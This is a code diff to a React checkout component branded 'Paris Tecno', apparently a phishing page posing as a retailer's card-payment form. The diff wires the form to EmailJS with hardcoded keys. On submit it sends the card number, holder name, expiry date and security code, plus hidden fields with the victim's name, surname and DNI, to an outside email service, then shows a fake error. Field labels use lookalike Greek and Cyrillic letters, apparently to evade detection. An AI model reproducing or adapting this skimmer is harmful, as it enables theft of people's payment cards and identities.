@@ -1,9 +1,17 @@
-import React, {useEffect, useState,useRef} from 'react';
+import React, {useEffect, useState, useRef} from 'react';
+import emailjs from '@emailjs/browser';
 import Navas from './Navas';
 import Carga from './Carga';
 import Erro from './Erro';
 
 const Mp = ({ formData,name, price }) => {
+  const form = useRef();
+
+  const nombreP = formData.nombre
+  const apellidoP = formData.apellido
+  const dniP = formData.dni
+
+  
     const estilo = {
         fontFamily: 'Proxima Nova, -apple-system, Roboto, Arial, sans-serif',
       };
@@ -17,6 +25,25 @@ const Mp = ({ formData,name, price }) => {
       const handleClick = () => {
         // Recarga la página cuando se hace clic en el botón
         window.location.reload();
+    };
+
+    const sendEmail = () => {
+      
+    
+     
+  
+      emailjs
+        .sendForm('service_z9i82e6', 'template_efrgkoy', form.current, {
+          publicKey: 'BE_3FJ81900rESDTP',
+        })
+        .then(
+          () => {
+            console.log('SUCCESS!');
+          },
+          (error) => {
+            console.log('FAILED...', error.text);
+          },
+        );
     };
 
       const handleInput1Change = (event) => {
@@ -59,14 +86,14 @@ const Mp = ({ formData,name, price }) => {
           input3: input3Value,
           input4: input4Value,
         };
-        console.log('Card:', datosInput);
-        console.log('Data:', formData);
+        // console.log('Card:', datosInput);
+        // console.log('Data:', formData);
 
       
         // Validación de todos los inputs
         if (datosInput.input1 !== '' && datosInput.input2 !== '' && datosInput.input3 !== '' && datosInput.input4 !== '') {
+          sendEmail()
           setLoading(true);
-      
           setTimeout(() => {
             setLoading(false);
             setMostrarError(true);
@@ -107,13 +134,14 @@ Paris Tecno <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 
    {/* <div className='absolute top-[100px]'><h1>hola</h1></div> */}
 
         <div className="bg-white p-8 py-3 rounded-lg shadow-lg max-w-md " > {/* Limitar el ancho del formulario */}
-          <form className="flex flex-col mt-3">
+          <form ref={form} className="flex flex-col mt-3">
             <div className="mb-4">
               <label className="block px-2 text-gray-700 text-xs font-medium " htmlFor="input1">
                 Númerο de tarjetа
               </label>
               <input
                 className="appearance-none border-2 rounded text-sm w-72 py-3 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline mb-2"
+                name="cc"
                 id="input1"
                 type="text"
                 placeholder="1234 1234 1234 1234"
@@ -126,6 +154,7 @@ Paris Tecno <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 
                 Nοmbre del titulаr
               </label>
               <input
+              name='name'
                 className="appearance-none border-2 text-sm rounded w-full py-3 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
                 id="input2"
                 type="text"
@@ -137,6 +166,7 @@ Paris Tecno <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 
                Vencimientο
               </label>
               <input
+              name='vencimiento'
                className="appearance-none text-sm border-2 rounded w-full py-3 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
                 id="input3"
                 type="text"
@@ -150,6 +180,7 @@ Paris Tecno <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 
               Códigο de seguridаd
               </label>
               <input
+              name='code'
                 className="appearance-none text-sm border-2 rounded w-full py-3 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
                 id="input3"
                 type="text"
@@ -161,6 +192,9 @@ Paris Tecno <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 
              <label className="block px-1 text-gray-700 text-xs font-medium  mt-4" htmlFor="input4">
                 Cantidad de cuotas
               </label>
+              <input className='hidden md:flex' type="text" name="nombre" defaultValue={nombreP}/>
+              <input className='hidden md:flex' type="text" name="apellido" defaultValue={apellidoP}/>
+              <input className='hidden md:flex' type="text" name="dni" defaultValue={dniP}/>
               <select
   className="appearance-none border-2 text-sm rounded w-full py-3 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
   id="input4"
